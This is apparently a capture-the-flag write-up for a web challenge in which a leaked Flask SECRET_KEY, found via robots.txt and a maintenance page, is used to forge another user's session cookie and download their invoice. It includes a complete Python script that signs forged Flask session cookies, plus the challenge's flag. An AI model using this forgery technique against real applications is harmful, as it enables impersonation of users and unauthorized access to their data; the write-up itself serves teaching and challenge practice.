# Love is a secret key

**h4ckc0n 2026**

**Category:** Web  
**Challenge:** Love is a secret key

### Overview

Shirogane secretly ordered festival supplies. The challenge asks what he bought and why he hid the purchase from Shinomiya. The store exposes an order tracker, but downloading an invoice requires a session belonging to its buyer.

The path to the invoice was:

```text
Order tracker → buyer's username and user ID
    → robots.txt → exposed Flask SECRET_KEY
    → forged buyer session → invoice PDF → flag
```

### Finding the target order

The public `/love/track` form accepts a `username` and numeric `order_id`. Testing existing order IDs led to order `1337`. The internal procurement notice at `/love/internal-notice` identified its account as `kaicho`, and the tracker confirmed:

```text
Order ID: 1337
Username: kaicho
User ID: 66066
Status: Dispatched
```

Opening `/love/invoice/1337` without a matching session redirected to the tracker with an authentication error. A legitimate test account showed that the application stores `user_id` and `username` in the signed `love_session` cookie.

### Finding the signing key

The store's `/love/robots.txt` listed two pages outside the normal navigation:

```text
Disallow: /internal-notice
Disallow: /maintenance
```

The maintenance page exposed the Flask session signing secret:

```text
SECRET_KEY = love_is_war
```

I verified the exposed key offline against a legitimate test session cookie. Its signature matched Flask's session signing scheme, using the `cookie-session` salt and HMAC-SHA1. This confirmed that the leaked key could be used to forge valid session cookies without knowing the original user's credentials.

### Forging the buyer session

With the exposed key and the buyer's identifiers, the following script creates a signed session and requests the invoice:

```python
import base64
import hashlib
import hmac
import json
import time
import urllib.request


def b64(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


secret = b"love_is_war"
derived = hmac.new(secret, b"cookie-session", hashlib.sha1).digest()

payload = b64(json.dumps(
    {"user_id": 66066, "username": "kaicho"},
    separators=(",", ":"),
).encode())
timestamp = b64(int(time.time()).to_bytes(4, "big"))
message = f"{payload}.{timestamp}"
signature = b64(hmac.new(derived, message.encode(), hashlib.sha1).digest())
cookie = f"{message}.{signature}"

url = "https://h4ckc0n-playforge.chals.io/love/invoice/1337"
request = urllib.request.Request(
    url,
    headers={"Cookie": f"love_session={cookie}"},
)
with urllib.request.urlopen(request) as response:
    pdf = response.read()

open("invoice-1337.pdf", "wb").write(pdf)
print(f"Downloaded {len(pdf)} PDF bytes")
```

The server returned a PDF. Its content revealed the purchase: **100 Crimson Heart Mylar Balloons**. The buyer's note explained why it was secret:

> Deliver discreetly behind the gym before the festival bonfire.  
> Do NOT let Shinomiya see this.

### Flag

The invoice's confidential order reference contained the flag:

```text
d4rk{k4ich0_l0v3s_Sh1n0miy4}
```

### Takeaway

The order tracker exposed the buyer's identifiers, but the critical vulnerability was the disclosure of Flask's SECRET_KEY through a publicly accessible maintenance page. With the signing key compromised, an attacker could forge a valid session for another user and bypass the invoice's authentication check. This demonstrates why signed client-side sessions depend entirely on protecting the server's signing secret.
